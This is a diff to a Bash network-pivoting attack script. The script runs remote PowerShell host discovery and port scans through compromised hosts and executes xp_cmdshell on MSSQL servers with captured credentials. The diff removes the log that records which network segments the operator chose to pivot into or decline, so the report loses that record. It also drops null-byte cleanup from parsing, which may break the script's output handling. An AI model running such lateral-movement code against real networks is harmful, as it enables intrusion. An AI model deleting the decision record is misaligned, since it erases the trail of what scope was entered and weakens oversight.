@@ -83,9 +83,6 @@ NETWORKS_FILE="$PIVOT_DIR/networks-discovered.txt"
 PORTPROXY_FILE="$PIVOT_DIR/portproxy-rules.txt"
 > "$PORTPROXY_FILE"
 
-# Track pivot decisions for the report generator
-> "$PIVOT_DIR/pivot-decisions.txt"
-
 # Global proxy port counter
 NEXT_PROXY_PORT=$PROXY_BASE_PORT
 
@@ -314,7 +311,7 @@ remote_scan_segment() {
 
     local LIVE_HOSTS
     LIVE_HOSTS=$(remote_exec "$PIVOT_HOST" "powershell.exe -Command \"${PS_DISCOVERY}\"" 2>&1 | \
-        tr -d '\0' | grep -oP '[\d]+\.[\d]+\.[\d]+\.[\d]+' | sort -u)
+        grep -oP '[\d]+\.[\d]+\.[\d]+\.[\d]+' | sort -u)
 
     if [[ -z "$LIVE_HOSTS" ]]; then
         echo "[-]   No live hosts found on $NEW_CIDR from $PIVOT_HOST."
@@ -340,7 +337,7 @@ remote_scan_segment() {
 
         local SCAN_RESULT
         SCAN_RESULT=$(remote_exec "$PIVOT_HOST" "powershell.exe -Command \"${PS_PORTSCAN}\"" 2>&1 | \
-            tr -d '\0' | grep ":open" | grep -oP '[\d]+\.[\d]+\.[\d]+\.[\d]+:\d+')
+            grep ":open" | grep -oP '[\d]+\.[\d]+\.[\d]+\.[\d]+:\d+')
 
         while read -r HOSTPORT; do
             [[ -z "$HOSTPORT" ]] && continue
@@ -551,7 +548,7 @@ declare -A SEGMENT_PIVOT_MAP  # CIDR -> "PIVOT_HOST|REACHABLE_IP"
 
 while IFS=: read -r IP PORT U P; do
     IPCONFIG=$(printf "exec master..xp_cmdshell 'ipconfig /all';\nexit\n" | \
-	mssqlclient "${U}:${P}@${IP}" -port "$PORT" 2>&1)
+        mssqlclient "${U}:${P}@${IP}" -port "$PORT" 2>&1)
 
     while IFS='|' read -r CIDR_RANGE PIVOT_IFACE_IP; do
         [[ -z "$CIDR_RANGE" ]] && continue
@@ -570,10 +567,8 @@ for CIDR in "${!SEGMENT_PIVOT_MAP[@]}"; do
     echo "[!] Reachable via $PIVOT_HOST (segment IP: $PIVOT_SEG_IP)"
     read -p "[?] Pivot into $CIDR? (y/n): " PIVOT_CONFIRM
     if [[ "$PIVOT_CONFIRM" =~ ^[Yy] ]]; then
-        echo "PIVOTED:$CIDR" >> "$PIVOT_DIR/pivot-decisions.txt"
         attack_new_segment "$PIVOT_HOST" "$PIVOT_REACH_IP" "$CIDR" "$PIVOT_SEG_IP"
     else
-        echo "DECLINED:$CIDR" >> "$PIVOT_DIR/pivot-decisions.txt"
         echo "[*] Skipping $CIDR per operator decision."
     fi
 done
@@ -642,10 +637,8 @@ else
                             echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
                             read -p "[?] Pivot into $CIDR_RANGE? (y/n): " PIVOT_CONFIRM
                             if [[ "$PIVOT_CONFIRM" =~ ^[Yy] ]]; then
-                                echo "PIVOTED:$CIDR_RANGE" >> "$PIVOT_DIR/pivot-decisions.txt"
                                 attack_new_segment "$HOST" "$HOST" "$CIDR_RANGE" "$PIVOT_IFACE_IP"
                             else
-                                echo "DECLINED:$CIDR_RANGE" >> "$PIVOT_DIR/pivot-decisions.txt"
                                 echo "[*] Skipping $CIDR_RANGE per operator decision."
                             fi
                         done < <(parse_networks_from_ipconfig "$IPCONFIG")
